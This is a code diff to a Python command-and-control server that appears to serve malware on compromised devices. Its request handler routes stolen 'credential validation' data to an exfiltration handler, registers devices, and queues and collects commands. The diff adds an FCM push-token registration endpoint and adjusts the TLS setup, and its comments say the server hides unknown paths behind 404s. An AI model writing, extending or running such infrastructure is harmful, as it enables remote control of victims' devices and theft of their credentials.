@@ -6,13 +6,8 @@ from exfil_handler import handle_exfil_data, handle_analytics_data
 from command_handler import handle_device_registration, handle_command_request, handle_command_response
 from data_view import serve_data_listing, serve_command_results, serve_devices_listing
 from log_util import logger
+from command_handler import handle_fcm_registration
 import ssl
-
-
-# Use the directory where the script is located for data storage
-SCRIPT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-DATA_DIR = os.path.join(SCRIPT_DIR, "harvested_data")
-
 
 class C2RequestHandler(BaseHTTPRequestHandler):
     """
@@ -102,6 +97,9 @@ class C2RequestHandler(BaseHTTPRequestHandler):
                 # Special handling for credential validation
                 logger.debug("Processing credential validation (auth) data")
                 handle_exfil_data(self, post_data)
+            elif path == "/register_fcm" or path == "/api/register_fcm":
+                logger.debug("Processing FCM token registration")
+                handle_fcm_registration(self, post_data)
             else:
                 # Respond with 404 for unrecognized paths to avoid exposing the server
                 logger.warning(f"Unrecognized path requested: {path}")
@@ -116,13 +114,11 @@ class C2RequestHandler(BaseHTTPRequestHandler):
 
 
 def run_c2_server(port, admin_port=8080, use_ssl=True, cert_path=None, key_path=None):
-    # Create data directory if it doesn't exist
-    os.makedirs(DATA_DIR, exist_ok=True)
 
     httpd = HTTPServer(('0.0.0.0', port), C2RequestHandler)
 
     if use_ssl and cert_path and key_path:
-        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         ssl_context.load_cert_chain(certfile=cert_path, keyfile=key_path)
         httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)
         logger.info("SSL enabled with provided certificate")
